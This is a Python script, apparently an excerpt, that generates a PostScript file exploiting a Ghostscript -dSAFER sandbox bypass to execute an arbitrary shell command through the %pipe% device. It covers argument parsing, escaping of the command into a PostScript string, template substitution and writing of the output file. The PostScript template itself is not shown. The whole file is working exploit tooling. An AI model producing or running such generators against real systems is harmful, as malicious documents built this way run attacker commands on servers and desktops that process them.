def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Build the Ghostscript -dSAFER bypass / command-execution PoC."
    )
    parser.add_argument(
        "--cmd",
        default=DEFAULT_COMMAND,
        help=f"shell command to execute (default: {DEFAULT_COMMAND!r})",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        default=DEFAULT_OUTPUT,
        help=f"output .ps path (default: {DEFAULT_OUTPUT})",
    )
    parser.add_argument(
        "--trace-stages",
        action="store_true",
        help="print coarse exploit stage markers for groom debugging",
    )
    return parser.parse_args(argv)


def encode_command(command: str) -> bytes:
    try:
        command_bytes = command.encode("ascii")
    except UnicodeEncodeError as exc:
        raise SystemExit("command must be ASCII bytes; shell metacharacters are fine") from exc

    if not command_bytes:
        raise SystemExit("command must not be empty")
    if b"\x00" in command_bytes:
        raise SystemExit("command must not contain NUL bytes")
    return command_bytes


def command_comment(command: str) -> str:
    return command.encode("unicode_escape").decode("ascii")


def ps_string(data: bytes) -> str:
    out: list[str] = ["("]
    for byte in data:
        if byte in (0x28, 0x29, 0x5C):
            out.append("\\" + chr(byte))
        elif 0x20 <= byte <= 0x7E:
            out.append(chr(byte))
        else:
            out.append(f"\\{byte:03o}")
    out.append(")")
    return "".join(out)


def render_template(template: str, layout_values: dict[str, int]) -> str:
    rendered = template
    for name, value in layout_values.items():
        rendered = rendered.replace(f"__{name.upper()}__", str(value))
    return rendered


def build_postscript(command: str, trace_stages: bool = False) -> str:
    command_bytes = encode_command(command)
    pipe_command = ps_string(b"%pipe%" + command_bytes)
    return (
        render_template(PS_TEMPLATE, layout)
        .replace("__COMMAND_COMMENT__", command_comment(command))
        .replace("__TRACE_STAGES__", "1" if trace_stages else "0")
        .replace("__PIPE_COMMAND__", pipe_command)
    )


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    ps = build_postscript(args.cmd, args.trace_stages)
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(ps, encoding="ascii")
    print(
        f"wrote {args.output} with {len(args.cmd.encode('ascii'))} command bytes",
        file=sys.stderr,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
